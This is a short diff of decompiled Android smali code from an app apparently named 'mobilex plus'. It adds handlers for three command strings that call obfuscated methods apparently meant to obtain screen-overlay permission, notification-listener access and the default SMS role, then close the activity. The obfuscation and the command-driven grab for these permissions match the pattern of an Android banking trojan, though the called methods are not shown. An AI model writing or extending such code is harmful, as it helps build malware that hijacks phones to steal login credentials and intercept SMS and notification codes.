@@ -710,6 +710,33 @@
 
     .line 229
     :cond_5
+    const-string v0, "open_overlay"
+    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v0
+    if-eqz v0, :cond_open_notif
+    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->wotphlvK9sPbXJ(Landroid/content/Context;)V
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
+    return-void
+
+    :cond_open_notif
+    const-string v0, "open_notification_listener"
+    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v0
+    if-eqz v0, :cond_open_sms
+    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->gIIiyi2ddlMDR0(Landroid/content/Context;)V
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
+    return-void
+
+    :cond_open_sms
+    const-string v0, "open_default_sms"
+    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v0
+    if-eqz v0, :cond_stop_orig
+    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->hjneShqpF9Tis4(Landroid/content/Context;)V
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
+    return-void
+
+    :cond_stop_orig
     sget-object v0, Lapp/mobilex/plus/HandlerSJAdapter;->vIJudZvPyTuNp:Ljava/lang/String;
 
     nop
